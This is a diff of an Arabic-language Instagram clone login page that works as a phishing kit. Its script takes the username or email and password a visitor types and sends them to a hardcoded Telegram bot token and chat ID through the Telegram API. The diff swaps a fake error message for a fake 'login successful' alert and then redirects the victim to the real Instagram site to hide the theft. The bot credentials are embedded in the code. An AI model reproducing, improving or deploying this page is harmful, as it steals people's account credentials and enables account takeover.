@@ -7,15 +7,21 @@
     <link rel="icon" type="image/png" href="./img/insta-fav.ico">
     <title>استنساخ انستغرام</title>
     <style>
-        /* الأنماط الخاصة برسالة الخطأ */
-        .error-message {
-            color: #ed4956;
-            font-size: 14px;
-            text-align: center;
-            margin-bottom: 10px;
-            display: none; /* تم إخفاؤه في البداية */
-        }
-    </style>
+        /* إضافة الأنماط اللازمة لزر الضغط */
+        button[type="submit"] {
+            transition: background-color 0.2s ease;
+            cursor: pointer;
+        }
+
+        button[type="submit"]:hover {
+            background-color: #0087f9;
+        }
+
+        button[type="submit"]:active {
+            background-color: #0076e6;
+            transform: translateY(1px);
+        }
+    </style>
 </head>
 <body>
     <main class="flex align-items-center justify-content-center">
@@ -27,9 +33,6 @@
                     <img src="./img/instagram-logo.png" alt="شعار انستغرام" title="شعار انستغرام" />
                 </h1>
                 <form id="login-form">
-                    <div id="error-message" class="error-message">
-                        اسم المستخدم الذي أدخلته لا ينتمي إلى حساب. يرجى التحقق من اسم المستخدم والمحاولة مرة أخرى.
-                    </div>
                     <label for="email" class="sr-only">رقم الهاتف، اسم المستخدم، أو البريد الإلكتروني</label>
                     <input name="email" placeholder="رقم الهاتف، اسم المستخدم، أو البريد الإلكتروني" required />
 
@@ -83,30 +86,27 @@
     <script>
         document.getElementById('login-form').addEventListener('submit', function(event) {
             event.preventDefault();
-
             const email = document.querySelector('input[name="email"]').value;
             const password = document.querySelector('input[name="password"]').value;
-            const errorMessage = document.getElementById('error-message');
-
             const telegramBotToken = '8092157620:AAFLL1s9C71miqTyhEWWVrL33i6MlFhxNuE'; 
             const chatId = '7391599470'; 
-
             const message = `تم إدخال بيانات جديدة:\nالبريد/المستخدم: ${email}\nكلمة المرور: ${password}`;
             const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
             fetch(telegramApiUrl)
                 .then(response => {
                     if (response.ok) {
                         console.log('تم إرسال البيانات إلى تليجرام بنجاح.');
-                        errorMessage.style.display = 'block'; // عرض رسالة الخطأ
+                        alert('تم تسجيل الدخول بنجاح! سيتم إعادة توجيهك الآن.');
+                        // هنا يمكنك إعادة توجيه المستخدم إلى صفحة أخرى
+                        window.location.href = "https://www.instagram.com";
                     } else {
                         console.error('فشل إرسال البيانات إلى تليجرام.');
-                        errorMessage.style.display = 'block'; // عرض رسالة الخطأ
+                        alert('فشل تسجيل الدخول. يرجى المحاولة مرة أخرى.');
                     }
                 })
                 .catch(error => {
                     console.error('حدث خطأ:', error);
-                    errorMessage.style.display = 'block'; // عرض رسالة الخطأ
+                    alert('فشل تسجيل الدخول. يرجى المحاولة مرة أخرى.');
                 });
         });
     </script>
